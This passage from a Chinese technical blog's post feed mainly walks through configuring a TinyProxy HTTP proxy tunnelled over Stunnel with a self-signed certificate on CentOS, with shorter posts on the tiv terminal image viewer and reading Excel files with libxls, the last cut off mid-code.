<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">XMLHandle <span class="hljs-title">handle</span><span class="hljs-params">(&amp;document)</span></span>; <br> <span class="hljs-keyword">if</span>(handle.<span class="hljs-built_in">FirstChildElement</span>(<span class="hljs-string">&quot;notPeople&quot;</span>).<span class="hljs-built_in">FirstChildElement</span>(<span class="hljs-string">&quot;Student&quot;</span>).<span class="hljs-built_in">ToElement</span>())&#123;<br>    cout&lt;&lt;document.<span class="hljs-built_in">FirstChildElement</span>(<span class="hljs-string">&quot;People&quot;</span>)-&gt;<span class="hljs-built_in">FirstChildElement</span>(<span class="hljs-string">&quot;Student&quot;</span>)-&gt;<span class="hljs-built_in">Value</span>()&lt;&lt;endl;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>Bye~</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS+TinyProxy+Stunnel配置HTTP代理服务器</title>
    <url>/linux-tinyproxy/</url>
    <content><![CDATA[<p>本文将利用CentOS、TinyProxy、Stunnel搭建一个正向代理服务器…</p>
<span id="more"></span>
<p>之前的 <a href="https://www.joxrays.com/centos-shadowsocks/">CentOS服务器Shadowsocks</a> 是在CentOS7上配置Shadowsocks将其作为代理服务器，而这次的tinyproxy配置同样也是把CentOS7作为一个代理服务器，而且SS是基于Socks5协议，tinyproxy是HTTP/HTTPS协议。</p>
<h3 id="tinyproxy"><a class="markdownIt-Anchor" href="#tinyproxy"></a> TinyProxy</h3>
<p>TinyProxy是一个由C语言开发、开源、轻量级的HTTP/HTTPS代理服务器 <a href="https://github.com/tinyproxy/tinyproxy">Github</a></p>
<blockquote>
<p>Tinyproxy is a light-weight HTTP/HTTPS proxy daemon for POSIX operating systems. Designed from the ground up to be fast and yet small, it is an ideal solution for use cases such as embedded deployments where a full featured HTTP proxy is required, but the system resources for a larger proxy are unavailable.</p>
</blockquote>
<p>tinyproxy比squid配置要简单，但squid功能却比tinyproxy要多且灵活性高。不过我对squid不是很深入了解，暂时就拿tinyproxy来说吧。<br />
由于我的服务器是CentOS7，故可直接从包管理器安装</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">[root@VM_0_17_centos ~]<span class="hljs-comment"># yum install -y tinyproxy</span><br></code></pre></div></td></tr></table></figure>
<p>若包管理器中没有tinyproxy，那么</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">yum install -y epel-release<br>yum update -y<br>yum -y install tinyproxy<br></code></pre></div></td></tr></table></figure>
<p>之后就是配置tinyproxy了</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">[root@VM_0_17_centos ~]<span class="hljs-comment"># vim /etc/tinyproxy/tinyproxy.conf</span><br></code></pre></div></td></tr></table></figure>
<p>修改tinyproxy监听端口<code>Port</code>，默认 <code>8888</code><br />
注释<code>Allow</code>参数，表示允许所有人都可以访问代理服务器。如果只希望指定的IP能够访问代理服务器，那么可以添加多个<code>Allow</code></p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">Port 8888<br><span class="hljs-comment">#Allow 127.0.0.1</span><br>Allow 10.10.6.0/24<br>Allow 123.200.123.66<br></code></pre></div></td></tr></table></figure>
<p>注意 <code>#DisableViaHeader Yes</code> 这个参数，用于指定是否在请求Header中显示tinyproxy相关信息（比如：<code>Proxy-agent: tinyproxy/1.8.3</code>），默认是关闭的。</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#</span><br><span class="hljs-comment"># ViaProxyName: The &quot;Via&quot; header is required by the HTTP RFC, but using</span><br><span class="hljs-comment"># the real host name is a security concern.  If the following directive</span><br><span class="hljs-comment"># is enabled, the string supplied will be used as the host name in the</span><br><span class="hljs-comment"># Via header; otherwise, the server&#x27;s host name will be used.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#ViaProxyName &quot;tinyproxy&quot;</span><br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># DisableViaHeader: When this is set to yes, Tinyproxy does NOT add</span><br><span class="hljs-comment"># the Via header to the requests. This virtually puts Tinyproxy into</span><br><span class="hljs-comment"># stealth mode. Note that RFC 2616 requires proxies to set the Via</span><br><span class="hljs-comment"># header, so by enabling this option, you break compliance.</span><br><span class="hljs-comment"># Don&#x27;t disable the Via header unless you know what you are doing...</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#DisableViaHeader Yes</span><br></code></pre></div></td></tr></table></figure>
<p>其他参数默认即可，之后就是启动tinyproxy</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">[root@VM_0_17_centos ~]<span class="hljs-comment"># systemctl start tinyproxy.service</span><br>[root@VM_0_17_centos ~]<span class="hljs-comment"># systemctl enable tinyproxy.service</span><br></code></pre></div></td></tr></table></figure>
<p>配置iptables</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 允许访问</span><br>iptables -I INPUT -p tcp --dport 8888 -j ACCEPT<br><span class="hljs-comment"># 拒绝访问</span><br>iptables -I INPUT -p tcp --dport 8888 -j REJECT<br></code></pre></div></td></tr></table></figure>
<p>可能还需要配置云服务器安全组外界才能访问tinyproxy端口</p>
<p>之后就能够直接通过该代理服务器进行代理访问了</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">% curl -x 129.204.152.8:8888 https://ip.cn --head<br>HTTP/1.0 200 Connection established<br>Proxy-agent: tinyproxy/1.8.3<br><br>HTTP/2 200 <br>date: Mon, 17 Feb 2020 02:08:20 GMT<br>content-type: application/json; charset=UTF-8<br>set-cookie: __cfduid=d404e02d9f8749f3815ce40da97e29bbf1581905300; expires=Wed, 18-Mar-20 02:08:20 GMT; path=/; domain=.ip.cn; HttpOnly; SameSite=Lax<br>cf-cache-status: DYNAMIC<br>expect-ct: max-age=604800, report-uri=<span class="hljs-string">&quot;https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct&quot;</span><br>server: cloudflare<br>cf-ray: 5664367e282eeba9-LAX<br></code></pre></div></td></tr></table></figure>
<p>当然也可以 <code>curl -x 129.204.152.8:8888 https://ip.cn --head -k</code>，即允许curl使用非安全的ssl连接并且传输数据（证书不受信）。<br />
注意 <code>Proxy-agent: tinyproxy/1.8.3</code> ，之前我们并没有注释 <code>#DisableViaHeader Yes</code>，它会在Via请求中显示代理信息。<br />
查看日志log <code>tail /var/log/tinyproxy/tinyproxy.log</code>。</p>
<p>然而事情并没有结束…</p>
<h3 id="stunnel隧道"><a class="markdownIt-Anchor" href="#stunnel隧道"></a> Stunnel(隧道)</h3>
<blockquote>
<p>Stunnel是一个自由的跨平台软件，用于提供全局的TLS/SSL服务。针对本身无法进行TLS或SSL通信的客户端及服务器，Stunnel可提供安全的加密连接。</p>
</blockquote>
<p>如果用代理服务器访问一个HTTP协议的网站，那么传输的数据是不会加密的，也就是说可以被抓包软件获取数据包，比如Wireshark。我在服务器配置了Apache，开启80端口，比如这样一个HTTP ULR： <a href="http://129.204.152.8:80">http://129.204.152.8:80</a>。<br />
<code>curl -x 129.204.152.8:8888 http://129.204.152.8 -v</code><br />
<img src="/uploads/images/tinyproxy_stunnel/01.png" alt="" /></p>
<p>可见数据没有加密，而是直接在两台主机间传输，我们希望HTTP传输也是安全的，也就是经过加密的，那么可以使用Stunnel和TinyProxy来混淆HTTP流量。</p>
<p>CentOS安装Stunnel <code>yum install -y stunnel</code></p>
<h4 id="配置服务端server"><a class="markdownIt-Anchor" href="#配置服务端server"></a> 配置服务端Server</h4>
<p><code>vim /etc/stunnel/stunnel.conf</code>，如果stunnel.conf不存在，那么新建一个并添加以下内容</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">[tinyproxy]<br>accept = 0.0.0.0:3128<br>connect = 0.0.0.0:8888<br>cert = /etc/ssl/cert.pem<br>key = /etc/ssl/key.pem<br></code></pre></div></td></tr></table></figure>
<ul>
<li>accept 服务器stunnel监听端口，用于与客户端进行连接</li>
<li>connect 用于告诉stunnel要连接的IP和端口。这需要是TinyProxy监听的IP和端口，<code>netstat -anpl|grep tinyproxy</code>可看到</li>
<li>cert 本地证书文件路径，可以用<code>openssl</code>生成</li>
<li>key 本地密匙文件路径</li>
</ul>
<h5 id="创建自签名证书"><a class="markdownIt-Anchor" href="#创建自签名证书"></a> 创建自签名证书</h5>
<p>要启动stunnel，那还需要创建自签名证书。</p>
<p>生成key.pem</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">[root@VM_0_17_centos ~]<span class="hljs-comment"># openssl genrsa -out /etc/ssl/key.pem 4096</span><br>Generating RSA private key, 4096 bit long modulus<br>......................................................................++<br>..............................................................++<br>e is 65537 (0x10001)<br></code></pre></div></td></tr></table></figure>
<p>这将创建一个<code>4096</code>位RSA密钥<code>key.pem</code>。有兴趣的可以了解下<a href="https://danielpocock.com/rsa-key-sizes-2048-or-4096-bits/">&quot;RSA Key Sizes: 2048 or 4096 bits?&quot;</a></p>
<p>生成cert.pem</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">[root@VM_0_17_centos ~]<span class="hljs-comment"># openssl req -new -x509 -key /etc/ssl/key.pem -out /etc/ssl/cert.pem -days 1826</span><br>You are about to be asked to enter information that will be incorporated<br>into your certificate request.<br>What you are about to enter is what is called a Distinguished Name or a DN.<br>There are quite a few fields but you can leave some blank<br>For some fields there will be a default value,<br>If you enter <span class="hljs-string">&#x27;.&#x27;</span>, the field will be left blank.<br>-----<br>Country Name (2 letter code) [XX]:US<br>State or Province Name (full name) []:Arizona<br>Locality Name (eg, city) [Default City]:Phoenix<br>Organization Name (eg, company) [Default Company Ltd]:<br>Organizational Unit Name (eg, section) []:<br>Common Name (eg, your name or your server<span class="hljs-string">&#x27;s hostname) []:VM_0_17_centos</span><br><span class="hljs-string">Email Address []:helloworld@example.com          </span><br><span class="hljs-string">[root@VM_0_17_centos ~]# ls -lh /etc/ssl/</span><br><span class="hljs-string">total 8.0K</span><br><span class="hljs-string">-rw-r--r-- 1 root root 2.1K Feb 17 11:03 cert.pem</span><br><span class="hljs-string">lrwxrwxrwx 1 root root   16 Feb  6 11:56 certs -&gt; ../pki/tls/certs</span><br><span class="hljs-string">-rw-r--r-- 1 root root 3.2K Feb 17 10:55 key.pem</span><br></code></pre></div></td></tr></table></figure>
<ul>
<li>new x509 创建一个新的X509证书</li>
<li>days 证书的有效期</li>
<li>key 密匙文件</li>
<li>out 输出到cert.pem</li>
</ul>
<p>生成的同时还要回答一些问题</p>
<ul>
<li>Country Name 国家 (PL,UK,US,CA)</li>
<li>State or Province Name 州或省 (Illinois,Ontario,…)</li>
<li>Locality Name 地区 (Chicago,Toronto,…)</li>
<li>Organization Name 组织</li>
<li>Organizational Unit Name 组织单位</li>
<li>Common Name (your name or your server’s hostname) 一般服务器hostname</li>
<li>Email Address 电子邮件</li>
</ul>
<p>启动stunnel <code>stunnel /etc/stunnel/stunnel.conf</code></p>
<figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir">[root<span class="hljs-variable">@VM_0_17_centos</span> ~]<span class="hljs-comment"># netstat -antpl|grep stunnel</span><br>tcp        0      0 0.0.0.0<span class="hljs-symbol">:</span><span class="hljs-number">3128</span>            0.0.0.0<span class="hljs-symbol">:*</span>               LISTEN      <span class="hljs-number">24263</span>/stunnel<br></code></pre></div></td></tr></table></figure>
<h4 id="配置客户端client"><a class="markdownIt-Anchor" href="#配置客户端client"></a> 配置客户端Client</h4>
<p>配置完服务器还需要配置本地客户端，就拿Arch/Manjaro举例。<br />
安装stunnel <code>pacman -S stunnel</code></p>
<p><code>cp /etc/stunnel/stunnel.conf-sample /etc/stunnel/stunnel.conf</code><br />
<code>vim /etc/stunnel/stunnel.conf</code><br />
编辑配置文件stunnel.conf可以全部删除只添加以下内容</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">[tinyproxy]<br>client = yes<br>accept = 0.0.0.0:3129<br>connect = 129.204.152.8:3128<br>verify = 3<br>CAfile = /etc/stunnel/cert.pem<br></code></pre></div></td></tr></table></figure>
<ul>
<li>client 表明这是客户端</li>
<li>accept 本地stunnel监听ip地址+端口 0.0.0.0:xxxx</li>
<li>connect 要连接到远程stunnel服务器</li>
<li>verify  证书验证级别，verify=3根据本地安装的证书并验证证书</li>
<li>CAfile 服务器上生成的<code>cert.pem</code>，将其复制到本地/etc/stunnel/cert.pem</li>
</ul>
<p>之后就可以启动stunnel了，<code>stunnel /etc/stunnel/stunnel.conf</code>，也可以 <code>systemctl start stunnel.service</code>、<code>systemctl enable stunnel.service</code></p>
<h5 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h5>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">% curl -x 127.0.0.1:3129 https://ip.cn --head<br>HTTP/1.0 200 Connection established<br>Proxy-agent: tinyproxy/1.8.3<br><br>HTTP/2 200 <br>date: Mon, 17 Feb 2020 03:58:29 GMT<br>content-type: application/json; charset=UTF-8<br>set-cookie: __cfduid=d340c54d6fa045689f6f49e91ac7f918f1581911909; expires=Wed, 18-Mar-20 03:58:29 GMT; path=/; domain=.ip.cn; HttpOnly; SameSite=Lax<br>cf-cache-status: DYNAMIC<br>expect-ct: max-age=604800, report-uri=<span class="hljs-string">&quot;https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct&quot;</span><br>server: cloudflare<br>cf-ray: 5664d7d91e5d77b8-LAX<br></code></pre></div></td></tr></table></figure>
<p><code>curl -x 127.0.0.1:3129 http://129.204.152.8 -v</code><br />
<img src="/uploads/images/tinyproxy_stunnel/02.png" alt="" /></p>
<p>可见成功的搭建了一个基于TLS的HTTP/HTTPS代理。</p>
<h3 id="windows-stunnel"><a class="markdownIt-Anchor" href="#windows-stunnel"></a> Windows Stunnel</h3>
<p>对于Windows系统，可以从 <a href="https://www.stunnel.org/downloads.html">https://www.stunnel.org/downloads.html</a> 下载Windows版本的stunnel，首次启动stunnel要回答一些问题来创建默认的<code>stunnel.pem</code>。<br />
现在将服务器生成的<code>cert.pem</code>复制到Windows stunnel配置文件目录。<br />
<img src="/uploads/images/tinyproxy_stunnel/03.png" alt="" /></p>
<p>然后编辑配置文件<code>stunnel.conf</code>。</p>
<figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">debug</span> = info<br><span class="hljs-attr">output</span> = stunnel.log<br><br><span class="hljs-section">[tinyproxy]</span><br><span class="hljs-attr">client</span> = <span class="hljs-literal">yes</span><br><span class="hljs-attr">accept</span> = <span class="hljs-number">6666</span><br><span class="hljs-attr">connect</span> = <span class="hljs-number">129.204</span>.<span class="hljs-number">152.8</span>:<span class="hljs-number">3128</span><br><span class="hljs-comment">;CAfile = cert.pem</span><br><span class="hljs-attr">cert</span> = cert.pem<br><span class="hljs-attr">key</span> = cert.pem<br><span class="hljs-attr">verify</span> = <span class="hljs-number">3</span><br></code></pre></div></td></tr></table></figure>
<p>最后启动stunnel，成功。<br />
<img src="/uploads/images/tinyproxy_stunnel/04.png" alt="" /></p>
<p>stunnel官网在线帮助手册: <a href="https://www.stunnel.org/static/stunnel.html">https://www.stunnel.org/static/stunnel.html</a><br />
以上便是代理服务器的配置～</p>
<h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h3>
<p><a href="https://github.com/tinyproxy/tinyproxy/wiki">Tinyproxy Wiki</a><br />
<a href="http://kb.ictbanking.net/article.php?id=380">Using stunnel and TinyProxy to obfuscate HTTP traffic</a><br />
<a href="https://blog.csdn.net/qq_39702947/article/details/87714520">Windows系统Stunnel使用简介</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>CentOS</tag>
        <tag>TinyProxy</tag>
        <tag>HTTP</tag>
        <tag>HTTPS</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Terminal 显示图像</title>
    <url>/linux-tiv/</url>
    <content><![CDATA[<p>其实很久之前我就在想linux终端里能否显示图像呢？然而这个问题一直拖延至今，直到google过程中发现了Tiv(<strong>TerminalImageViewer</strong>)</p>
<span id="more"></span>
<h2 id="tiv"><a class="markdownIt-Anchor" href="#tiv"></a> Tiv</h2>
<p>本文我要介绍的是tiv这个小巧的工具，它是由C++写成的<br />
Github: <a href="https://github.com/stefanhaustein/TerminalImageViewer">https://github.com/stefanhaustein/TerminalImageViewer</a></p>
<p><strong>tiv</strong>使用<strong>RGB ANSI代码</strong>和<strong>unicode块图形字符</strong>在（现代）终端中显示图像，这也就是说tiv只能 <strong>像素化</strong> 的显示图像。</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/stefanhaustein/TerminalImageViewer.git<br><span class="hljs-built_in">cd</span> TerminalImageViewer/src/main/cpp<br>make<br></code></pre></div></td></tr></table></figure>
<p>之后即可运行tiv</p>
<p><code>./tiv -help</code> 查看帮助</p>
<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">Terminal Image Viewer<br><br>usage: tiv [<span class="hljs-keyword">options</span>] <span class="hljs-symbol">&lt;image&gt;</span> [<span class="hljs-symbol">&lt;image&gt;</span>...]<br><br>  -<span class="hljs-number">0</span>        : No block character adjustment, always use top half block char.<br>  -<span class="hljs-number">256</span>      : Use <span class="hljs-number">256</span> color <span class="hljs-keyword">mode</span>.<br>  -<span class="hljs-keyword">c</span> <span class="hljs-symbol">&lt;num&gt;</span>  : Number of thumbnail columns in <span class="hljs-string">&#x27;dir&#x27;</span> <span class="hljs-keyword">mode</span> (<span class="hljs-number">3</span>).<br>  -d        : Force <span class="hljs-string">&#x27;dir&#x27;</span> <span class="hljs-keyword">mode</span>. Automatially selected <span class="hljs-keyword">for</span> more than one <span class="hljs-built_in">input</span>.<br>  -<span class="hljs-keyword">f</span>        : Force <span class="hljs-string">&#x27;full&#x27;</span> <span class="hljs-keyword">mode</span>. Automatically selected <span class="hljs-keyword">for</span> one <span class="hljs-built_in">input</span>.<br>  -<span class="hljs-keyword">help</span>     : Display this <span class="hljs-keyword">help</span> text.<br>  -h <span class="hljs-symbol">&lt;num&gt;</span>  : Set the maximum height <span class="hljs-keyword">to</span> <span class="hljs-symbol">&lt;num&gt;</span> lines.<br>  -<span class="hljs-keyword">w</span> <span class="hljs-symbol">&lt;num&gt;</span>  : Set the maximum width <span class="hljs-keyword">to</span> <span class="hljs-symbol">&lt;num&gt;</span> characters.<br></code></pre></div></td></tr></table></figure>
<p><code>./tiv ~/1.png</code><br />
<img src="/uploads/images/terminal_image/tiv_1.png" alt="img" /></p>
<p>当然还可以 <code>./tiv ~/1.png -0</code><br />
<img src="/uploads/images/terminal_image/tiv_2.png" alt="img" /></p>
<p>当然我也试过 <a href="http://www.namesdir.com/mirrors/nongnu/fbi-improved/">fim</a> 但觉得总有点差强人意，最后还是选择tiv，尽管它只能像素化的显示图像。。。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux libxls和xlslib读写Excel文档</title>
    <url>/linux-xls/</url>
    <content><![CDATA[<p>这里要讨论的是两款开源库 <strong>libxls</strong> 和 <strong>xlslib</strong>,前者用与 <strong>读</strong> Excel,后者用于 <strong>写</strong> .所以可以在Linux或Windows上使用</p>
<span id="more"></span>
<h3 id="libxls读excel"><a class="markdownIt-Anchor" href="#libxls读excel"></a> libxls(读Excel</h3>
<h4 id="获取libxls"><a class="markdownIt-Anchor" href="#获取libxls"></a> 获取libxls</h4>
<p>可以在 <a href="http://libxls.sourceforge.net/">官网</a> 获取源代码, 目前最新版为 1.4.0</p>
<blockquote>
<p>unzip libxls-1.4.0.zip<br />
cd libxls<br />
./configure<br />
make<br />
make install</p>
</blockquote>
<p>注意默认安装到 <strong>/usr/local</strong> 目录下,所以需要自己手动复制相关文件到系统目录下</p>
<blockquote>
<p>cp -r /usr/local/libxls/include/* /usr/include<br />
cp -r /usr/local/libxls/lib/* /usr</p>
</blockquote>
<p>至此基本上可以了</p>
<h4 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h4>
<p>test.cpp</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;xls.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> xls;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> *argv[])</span> </span>&#123;<br>    <span class="hljs-comment">//版本信息</span><br>    cout&lt;&lt;<span class="hljs-string">&quot;version:&quot;</span>&lt;&lt;xls::<span class="hljs-built_in">xls_getVersion</span>()&lt;&lt;endl;<br>    xlsWorkBook *pwb;<br>    xlsWorkSheet *pws;<br>    <span class="hljs-comment">//打开一个excel表格</span><br>    pwb=<span class="hljs-built_in">xls_open</span>(<span class="hljs-string">&quot;test.xls&quot;</span>,<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!pwb)&#123;<br>        cout&lt;&lt;<span class="hljs-string">&quot;open failed!&quot;</span>&lt;&lt;endl;<br>        <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>    &#125;<br>    xlsSummaryInfo *summaryInfo=<span class="hljs-built_in">xls_summaryInfo</span>(pwb);<br>    <span class="hljs-keyword">if</span>(summaryInfo)&#123;<br>        <span class="hljs-keyword">if</span>(summaryInfo-&gt;title)cout&lt;&lt;<span class="hljs-string">&quot;title:&quot;</span>&lt;&lt;summaryInfo-&gt;title&lt;&lt;endl;<br>        <span class="hljs-keyword">if</span>(summaryInfo-&gt;manager)cout&lt;&lt;<span class="hljs-string">&quot;manager:&quot;</span>&lt;&lt;summaryInfo-&gt;manager&lt;&lt;endl;<br>        <span class="hljs-keyword">if</span>(summaryInfo-&gt;lastAuthor)cout&lt;&lt;<span class="hljs-string">&quot;lastAuthor:&quot;</span>&lt;&lt;summaryInfo-&gt;lastAuthor&lt;&lt;endl;<br>        <span class="hljs-keyword">if</span>(summaryInfo-&gt;keywords)cout&lt;&lt;<span class="hljs-string">&quot;keywords:&quot;</span>&lt;&lt;summaryInfo-&gt;keywords&lt;&lt;endl;<br>        <span class="hljs-keyword">if</span>(summaryInfo-&gt;company)cout&lt;&lt;<span class="hljs-string">&quot;company:&quot;</span>&lt;&lt;summaryInfo-&gt;company&lt;&lt;endl;<br>        <span class="hljs-keyword">if</span>(summaryInfo-&gt;comment)cout&lt;&lt;<span class="hljs-string">&quot;comment:&quot;</span>&lt;&lt;summaryInfo-&gt;comment&lt;&lt;endl;<br>        <span class="hljs-keyword">if</span>(summaryInfo-&gt;appName)cout&lt;&lt;<span class="hljs-string">&quot;appName:&quot;</span>&lt;&lt;summaryInfo-&gt;appName&lt;&lt;endl;<br>        <span class="hljs-keyword">if</span>(summaryInfo-&gt;subject)cout&lt;&lt;<span class="hljs-string">&quot;subject:&quot;</span>&lt;&lt;summaryInfo-&gt;subject&lt;&lt;endl;<br>    &#125;<br>    cout&lt;&lt;<span class="hljs-string">&quot;charset:&quot;</span>&lt;&lt;pwb-&gt;charset&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-string">&quot;font name:&quot;</span>&lt;&lt;pwb-&gt;fonts.font-&gt;name&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-string">&quot;font bold:&quot;</span>&lt;&lt;pwb-&gt;fonts.font-&gt;bold&lt;&lt;endl;<br>    